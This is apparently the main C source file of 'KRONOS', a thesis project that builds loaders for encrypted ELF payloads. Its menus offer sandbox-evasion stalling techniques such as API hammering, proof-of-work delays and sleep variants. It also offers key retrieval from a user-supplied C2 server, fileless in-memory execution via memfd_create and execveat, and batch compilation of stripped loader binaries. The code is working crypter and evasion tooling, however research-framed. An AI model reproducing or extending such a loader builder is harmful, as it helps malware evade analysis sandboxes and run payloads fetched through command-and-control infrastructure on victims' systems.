/* main.c - Orchestration Engine and Main Menu with Evasion Families and Dynamic Key Derivation */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>

#include "builder.h"

#define MAX_STAGES 5

/* Colores ANSI para formateo estético de terminal */
#define COLOR_RESET   "\033[0m"
#define COLOR_BOLD    "\033[1m"
#define COLOR_CYAN    "\033[36m"
#define COLOR_GREEN   "\033[32m"
#define COLOR_RED     "\033[31m"
#define COLOR_YELLOW  "\033[33m"
#define COLOR_BLUE    "\033[34m"

static void clear_screen(void) {
    printf("\033[H\033[2J");
    fflush(stdout);
}

static void print_banner(void) {
    printf(COLOR_CYAN COLOR_BOLD);
    printf("  _  __ _____   ____   _   _   ____   _____\n");
    printf(" | |/ /|  __ \\ / __ \\ | \\ | | / __ \\ / ____|\n");
    printf(" | ' / | |__) | |  | ||  \\| || |  | | (___  \n");
    printf(" |  <  |  _  /| |  | || . ` || |  | |\\___ \\ \n");
    printf(" | . \\ | | \\ \\| |__| || |\\  || |__| |____) |\n");
    printf(" |_|\\_\\|_|  \\_\\\\____/ |_| \\_| \\____/|_____/ \n");
    printf(COLOR_RESET);
    printf(COLOR_BOLD " Dynamic Evasion & Execution-Stalling Test Framework\n" COLOR_RESET);
    printf(COLOR_BLUE " Version 1.0.0 | Master Thesis Project\n" COLOR_RESET);
    printf("-----------------------------------------------------\n\n");
}

/* ========================================================================= */
/* 1. FUNCIONES AUXILIARES Y MENÚ DE TÉCNICAS (INTERACTIVO)                  */
/* ========================================================================= */

static int file_exists(const char *filename) {
    struct stat buffer;
    return (stat(filename, &buffer) == 0);
}

static int select_evasion_technique(void) {
    int family_choice = 0;
    int tech_choice = 0;
    int tech_id = 0;

    while (1) {
        printf("\n" COLOR_BOLD "Select Evasion Family:" COLOR_RESET "\n");
        printf("    1) " COLOR_CYAN "COMPUTE" COLOR_RESET "        (CPU & Memory Heavy Operations)\n");
        printf("    2) " COLOR_CYAN "NETWORK" COLOR_RESET "        (Network Dependencies & Sockets)\n");
        printf("    3) " COLOR_CYAN "STORAGE" COLOR_RESET "        (File System & Disk I/O Stress)\n");
        printf("    4) " COLOR_CYAN "SYNCHRONIZATION" COLOR_RESET "(Thread Synchronization & Concurrency)\n");
        printf("    5) " COLOR_CYAN "TEMPORAL" COLOR_RESET "       (System Delays & Syscall Timers)\n");
        printf("    6) " COLOR_CYAN "HAMMERING" COLOR_RESET "      (API & Memory Flooding)\n");
        printf("    Selection (Family): ");

        if (scanf("%d", &family_choice) != 1) {
            while (getchar() != '\n');
            printf(COLOR_RED "    [!] Invalid input. Try again." COLOR_RESET "\n");
            continue;
        }

        switch (family_choice) {
            case 1:
                printf("\n    --- " COLOR_YELLOW "FAMILY 1: COMPUTE" COLOR_RESET " ---\n");
                printf("    1) Hash Chain Iteration        (ID: 101)\n");
                printf("    2) Floating Point Math         (ID: 102)\n");
                printf("    3) Compression Spam (Zlib)     (ID: 103)\n");
                printf("    4) Prime Number Calculation    (ID: 104)\n");
                printf("    5) Bitwise Logic Operations    (ID: 105)\n");
                printf("    6) Recursive Fibonacci         (ID: 106)\n");
                printf("    7) Junk Logic & Opcodes        (ID: 107)\n");
                printf("    8) Proof-of-Work Delay         (ID: 108)\n");
                printf("    Selection: ");
                if (scanf("%d", &tech_choice) == 1 && tech_choice >= 1 && tech_choice <= 8) {
                    tech_id = 100 + tech_choice;
                }
                break;

            case 2:
                printf("\n    --- " COLOR_YELLOW "FAMILY 2: NETWORK" COLOR_RESET " ---\n");
                printf("    1) TCP Socket Timeout          (ID: 201)\n");
                printf("    2) DNS Lookup Spam             (ID: 202)\n");
                printf("    3) Raw HTTP Request            (ID: 203)\n");
                printf("    4) Passive UDP Receive         (ID: 204)\n");
                printf("    5) External NTP Sync Check     (ID: 205)\n");
                printf("    6) Network Garbage Flood       (ID: 206)\n");
                printf("    7) Reverse DNS Resolution      (ID: 207)\n");
                printf("    8) External C2 Key Retrieval   (ID: 208)\n");
                printf("    Selection: ");
                if (scanf("%d", &tech_choice) == 1 && tech_choice >= 1 && tech_choice <= 8) {
                    tech_id = 200 + tech_choice;
                }
                break;

            case 3:
                printf("\n    --- " COLOR_YELLOW "FAMILY 3: STORAGE" COLOR_RESET " ---\n");
                printf("    1) Recursive Directory Walk    (ID: 301)\n");
                printf("    2) Heavy I/O Flush (fsync)     (ID: 302)\n");
                printf("    3) Entropy Source Wait         (ID: 303)\n");
                printf("    4) Sparse File Allocation      (ID: 304)\n");
                printf("    5) Directory Creation Spam     (ID: 305)\n");
                printf("    6) Memory Pressure / Swap      (ID: 306)\n");
                printf("    7) File Metadata Stat Queries  (ID: 307)\n");
                printf("    Selection: ");
                if (scanf("%d", &tech_choice) == 1 && tech_choice >= 1 && tech_choice <= 7) {
                    tech_id = 300 + tech_choice;
                }
                break;

            case 4:
                printf("\n    --- " COLOR_YELLOW "FAMILY 4: SYNCHRONIZATION" COLOR_RESET " ---\n");
                printf("    1) Thread Join Wait            (ID: 401)\n");
                printf("    2) Work Queue Blocking         (ID: 402)\n");
                printf("    3) IPC Pipe Wait               (ID: 403)\n");
                printf("    4) POSIX Semaphore Race        (ID: 404)\n");
                printf("    5) Event Condition Wait        (ID: 405)\n");
                printf("    6) Thread Barrier Point        (ID: 406)\n");
                printf("    7) Condition Var Broadcast     (ID: 407)\n");
                printf("    Selection: ");
                if (scanf("%d", &tech_choice) == 1 && tech_choice >= 1 && tech_choice <= 7) {
                    tech_id = 400 + tech_choice;
                }
                break;

            case 5:
                printf("\n    --- " COLOR_YELLOW "FAMILY 5: TEMPORAL" COLOR_RESET " ---\n");
                printf("    1) Standard sleep() Call       (ID: 501)\n");
                printf("    2) Empty select() Timeout      (ID: 502)\n");
                printf("    3) High-Res nanosleep()        (ID: 503)\n");
                printf("    4) Signal Alarm & Pause        (ID: 504)\n");
                printf("    5) Subprocess Sleep Wait       (ID: 505)\n");
                printf("    6) System ppoll() Wait         (ID: 506)\n");
                printf("    7) Interval setitimer()        (ID: 507)\n");
                printf("    Selection: ");
                if (scanf("%d", &tech_choice) == 1 && tech_choice >= 1 && tech_choice <= 7) {
                    tech_id = 500 + tech_choice;
                }
                break;

            case 6:
                printf("\n    --- " COLOR_YELLOW "FAMILY 6: HAMMERING" COLOR_RESET " ---\n");
                printf("    1) System API Hammering        (ID: 601)\n");
                printf("    2) Memory Allocation Hammer    (ID: 602)\n");
                printf("    Selection: ");
                if (scanf("%d", &tech_choice) == 1 && tech_choice >= 1 && tech_choice <= 2) {
                    tech_id = 600 + tech_choice;
                }
                break;

            default:
                printf(COLOR_RED "    [!] Invalid family selection." COLOR_RESET "\n");
                break;
        }

        if (tech_id != 0) {
            return tech_id;
        }

        printf(COLOR_RED "    [!] Invalid option. Please select again." COLOR_RESET "\n");
        while (getchar() != '\n');
    }
}

/* ========================================================================= */
/* 2. ESTRUCTURA Y LÓGICA DE GENERACIÓN EN LOTE (BATCH)                      */
/* ========================================================================= */

typedef struct {
    int tech_id;
    const char *tech_name;
    const char *family;
    int param; 
} batch_technique_t;

static const batch_technique_t BATCH_CATALOG[] = {
    {101, "delay_hash_chain",        "Compute",         5000000},
    {102, "delay_float_math",        "Compute",         100000000},
    {103, "delay_compression_spam", "Compute",         50000},
    {104, "delay_prime_calc",        "Compute",         10000000},
    {105, "delay_bitwise_ops",       "Compute",         1000000000},
    {106, "delay_recursive_fib",     "Compute",         42},
    {107, "delay_junk_logic",        "Compute",         100000000},
    {108, "pow_evasion",             "Compute/PoW",     1},

    {201, "delay_tcp_timeout",       "Network",         600},
    {202, "delay_dns_lookup_spam",  "Network",         10000},
    {203, "delay_http_request",     "Network",         600},
    {204, "delay_udp_recv",          "Network",         600},
    {205, "delay_ntp_sync_check",   "Network",         600},
    {206, "delay_network_garbage",  "Network",         50000},
    {207, "delay_reverse_dns",      "Network",         5000},
    {208, "c2_key_retrieval",       "Network",         0},

    {301, "delay_disk_walk",        "Storage",         100000},
    {302, "delay_heavy_io_blips",   "Storage",         50000},
    {303, "delay_entropy_source",   "Storage",         1000000},
    {304, "delay_sparse_file_bomb", "Storage",         10000},
    {305, "delay_mkdir_spam",       "Storage",         50000},
    {306, "delay_memory_pressure",  "Storage",         1024},
    {307, "delay_metadata_stat",    "Storage",         500000},

    {401, "delay_thread_join",       "Synchronization", 600},
    {402, "delay_queue_blocking",   "Synchronization", 600},
    {403, "delay_pipe_wait",        "Synchronization", 600},
    {404, "delay_semaphore_race",   "Synchronization", 1000000},
    {405, "delay_event_wait",       "Synchronization", 600},
    {406, "delay_barrier",          "Synchronization", 600},
    {407, "delay_condition_var",    "Synchronization", 600},

    {501, "sleep_standard",         "Temporal",        6000},
    {502, "sleep_select",           "Temporal",        6000},
    {503, "sleep_nanosleep",        "Temporal",        6000},
    {504, "sleep_signal",           "Temporal",        6000},
    {505, "sleep_subprocess_wait",  "Temporal",        6000},
    {506, "sleep_ppoll",            "Temporal",        6000},
    {507, "sleep_itimer",           "Temporal",        6000},

    {601, "execute_api_hammering",  "Hammering",       1000000},
    {602, "memory_hammering",       "Hammering",       500000}
};

static const int BATCH_CATALOG_SIZE = sizeof(BATCH_CATALOG) / sizeof(BATCH_CATALOG[0]);

static void execute_batch_mode(void) {
    char elf_path[256];
    char key_input[64];
    StageConfig batch_stage;
    char compile_cmd[512];

    printf("\n" COLOR_YELLOW "=====================================================\n");
    printf("         BATCH GENERATION: ALL TECHNIQUES TEST       \n");
    printf("=====================================================\n" COLOR_RESET "\n");

    do {
        printf("Path to target ELF binary (e.g., ./payloads/stage1.elf): ");
        scanf("%255s", elf_path);

        if (!file_exists(elf_path)) {
            printf(COLOR_RED "    [!] ERROR: File '%s' does not exist. Please try again." COLOR_RESET "\n", elf_path);
        }
    } while (!file_exists(elf_path));

    printf("Enter Passphrase / Seed string for ALL stage encryptions: ");
    scanf("%63s", key_input);

    system("mkdir -p dist_batch");

    printf("\n" COLOR_GREEN "[+] Starting compilation of %d individual technique loaders..." COLOR_RESET "\n\n", BATCH_CATALOG_SIZE);

    for (int i = 0; i < BATCH_CATALOG_SIZE; i++) {
        const batch_technique_t tech = BATCH_CATALOG[i];
        memset(&batch_stage, 0, sizeof(StageConfig));

        strncpy(batch_stage.elf_path, elf_path, sizeof(batch_stage.elf_path));
        strncpy(batch_stage.key_input, key_input, sizeof(batch_stage.key_input));
        batch_stage.exec_mode = 1;

        strncpy(batch_stage.net_ip, "192.0.2.1", sizeof(batch_stage.net_ip));
        strncpy(batch_stage.net_host, "nonexistent.test", sizeof(batch_stage.net_host));
        strncpy(batch_stage.net_path, "/", sizeof(batch_stage.net_path));
        batch_stage.net_port = 80;

        batch_stage.tech_id = tech.tech_id;
        batch_stage.tech_param = tech.param;
        batch_stage.pow_difficulty = tech.param;

        if (tech.tech_id == 108) {
            batch_stage.key_derivation_mode = 2;
        } else if (tech.tech_id == 208) {
            batch_stage.key_derivation_mode = 3;
        } else {
            batch_stage.key_derivation_mode = 1;
        }

        printf("[%2d/%d] Building: " COLOR_CYAN "%-25s" COLOR_RESET " (ID: %d)\n", 
               i + 1, BATCH_CATALOG_SIZE, tech.tech_name, tech.tech_id);

        if (run_builder(&batch_stage, 1) != 0) {
            fprintf(stderr, COLOR_RED "  [-] Error generating payload.h for %s" COLOR_RESET "\n", tech.tech_name);
            continue;
        }

        snprintf(compile_cmd, sizeof(compile_cmd),
            "gcc -Wall -O2 -s -Iinclude "
            "-ffunction-sections -fdata-sections "
            "-fvisibility=hidden "
            "loader.c "
            "-o dist_batch/loader_%s.elf "
            "-Wl,--gc-sections -lcrypto -lssl -lpthread -lm -lz -w",
            tech.tech_name);

        int status = system(compile_cmd);

        if (status != 0) {
            fprintf(stderr, COLOR_RED "  [-] GCC Compilation error on %s" COLOR_RESET "\n", tech.tech_name);
        }
    }

    printf("\n" COLOR_GREEN COLOR_BOLD "[✓] Batch generation completed! All binaries saved to: ./dist_batch/" COLOR_RESET "\n\n");
}

/* ========================================================================= */
/* 3. PUNTO DE ENTRADA PRINCIPAL                                             */
/* ========================================================================= */

int main(void) {
    int mode_choice = 0;
    int total_stages = 0;
    StageConfig stages[MAX_STAGES];

    memset(stages, 0, sizeof(stages));

    clear_screen();
    print_banner();

    printf(COLOR_BOLD "Select target binary structure:" COLOR_RESET "\n");
    printf("    1) Single Stage (1 Encrypted ELF + 1 Evasion Technique)\n");
    printf("    2) Multi-Stage  (N Chained ELFs with Derived Keys)\n");
    printf("    3) Batch Mode   (Generate 1 Binary per Technique for Sandbox Testing)\n");
    printf("  Option: ");
    if (scanf("%d", &mode_choice) != 1 || (mode_choice < 1 || mode_choice > 3)) {
        fprintf(stderr, COLOR_RED "[-] Invalid option." COLOR_RESET "\n");
        return EXIT_FAILURE;
    }

    if (mode_choice == 3) {
        execute_batch_mode();
        return EXIT_SUCCESS;
    }

    if (mode_choice == 1) {
        total_stages = 1;
    } else {
        printf("\nEnter number of stages to chain (2-%d): ", MAX_STAGES);
        if (scanf("%d", &total_stages) != 1 || total_stages < 2 || total_stages > MAX_STAGES) {
            fprintf(stderr, COLOR_RED "[-] Invalid number of stages." COLOR_RESET "\n");
            return EXIT_FAILURE;
        }
    }

    for (int i = 0; i < total_stages; i++) {
        strncpy(stages[i].net_ip, "127.0.0.1", sizeof(stages[i].net_ip));
        strncpy(stages[i].net_host, "localhost", sizeof(stages[i].net_host));
        strncpy(stages[i].net_path, "/", sizeof(stages[i].net_path));
        stages[i].net_port = 80;

        printf("\n" COLOR_CYAN "-----------------------------------------------------\n");
        printf(" CONFIGURATION FOR STAGE %d of %d\n", i + 1, total_stages);
        printf("-----------------------------------------------------" COLOR_RESET "\n");

        do {
            printf("Path to target ELF binary (e.g., ./payloads/stage%d.elf): ", i + 1);
            scanf("%255s", stages[i].elf_path);

            if (!file_exists(stages[i].elf_path)) {
                printf(COLOR_RED "    [!] ERROR: File '%s' does not exist. Please try again." COLOR_RESET "\n", stages[i].elf_path);
            }
        } while (!file_exists(stages[i].elf_path));

        printf("Enter Passphrase / Seed string for stage encryption: ");
        scanf("%63s", stages[i].key_input);

        stages[i].tech_id = select_evasion_technique();

        if (stages[i].tech_id == 108) {
            stages[i].key_derivation_mode = 2;
            printf("Enter PoW Difficulty bits: ");
            scanf("%d", &stages[i].pow_difficulty);
            stages[i].tech_param = stages[i].pow_difficulty;

        } else if (stages[i].tech_id == 208) {
            stages[i].key_derivation_mode = 3;
            stages[i].pow_difficulty = 0;
            stages[i].tech_param = 0;

            printf("[NETWORK C2] Enter C2 Hostname/Domain/IP (e.g., c2.example.com): ");
            scanf("%127s", stages[i].net_host);

            printf("[NETWORK C2] Enter C2 Port (e.g., 80, 8080 or 443): ");
            scanf("%d", &stages[i].net_port);

            printf("[NETWORK C2] Enter Key Endpoint URI Path (e.g., /api/v1/get_key): ");
            scanf("%63s", stages[i].net_path);

        } else {
            stages[i].key_derivation_mode = 1;
            stages[i].pow_difficulty = 0;

            switch (stages[i].tech_id) {
                case 201:
                    printf("[NETWORK] Enter Target IP (e.g., 1.1.1.1): ");
                    scanf("%63s", stages[i].net_ip);
                    printf("[NETWORK] Enter Target Port (e.g., 80): ");
                    scanf("%d", &stages[i].net_port);
                    break;

                case 203:
                    printf("[NETWORK] Enter Hostname/Domain (e.g., google.com): ");
                    scanf("%127s", stages[i].net_host);
                    break;

                case 204:
                    printf("[NETWORK] Enter Listening Port (e.g., 4444): ");
                    scanf("%d", &stages[i].net_port);
                    break;

                case 205:
                    printf("[NETWORK] Enter NTP Server (e.g., pool.ntp.org): ");
                    scanf("%127s", stages[i].net_host);
                    break;

                case 206:
                    printf("[NETWORK] Enter Target IP (e.g., 8.8.8.8): ");
                    scanf("%63s", stages[i].net_ip);
                    break;

                case 207:
                    printf("[NETWORK] Enter Base Subnet IP (e.g., 8.8.8.): ");
                    scanf("%63s", stages[i].net_ip);
                    break;

                default:
                    break;
            }

            printf("\nEvasion technique parameter (e.g., iterations or milliseconds): ");
            scanf("%d", &stages[i].tech_param);
        }

        printf("\nExecution mode for decrypted ELF:\n");
        printf("    1) RAM Fileless (memfd_create + execveat) [Recommended]\n");
        printf("    2) Temporary Disk (/tmp/ + execve)\n");
        printf("  Option: ");
        scanf("%d", &stages[i].exec_mode);
    }

    printf("\n=====================================================\n");
    printf("Generating payload.h with %d stage(s)...\n", total_stages);
    
    if (run_builder(stages, total_stages) != 0) {
        fprintf(stderr, COLOR_RED "[-] Error during Builder generation process." COLOR_RESET "\n");
        return EXIT_FAILURE;
    }
    printf(COLOR_GREEN "Header include/payload.h built successfully." COLOR_RESET "\n\n");
    
    printf("Compiling final Loader...\n");
    system("mkdir -p dist");

    const char *compile_cmd = 
        "mkdir -p dist && "
        "gcc -Wall -O2 -s -Iinclude "
        "-ffunction-sections -fdata-sections "
        "-fvisibility=hidden "
        "loader.c "
        "-o dist/loader_final.elf "
        "-Wl,--gc-sections -lcrypto -lssl -lpthread -lm -lz -w";

    int status = system(compile_cmd);
    
    if (status == 0) {
        printf(COLOR_GREEN COLOR_BOLD "\n[✓] Process completed successfully!" COLOR_RESET "\n");
        printf("    Binary generated at: " COLOR_CYAN "./dist/loader_final.elf" COLOR_RESET "\n\n");
    } else {
        fprintf(stderr, COLOR_RED "[-] GCC Compilation error." COLOR_RESET "\n");
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}
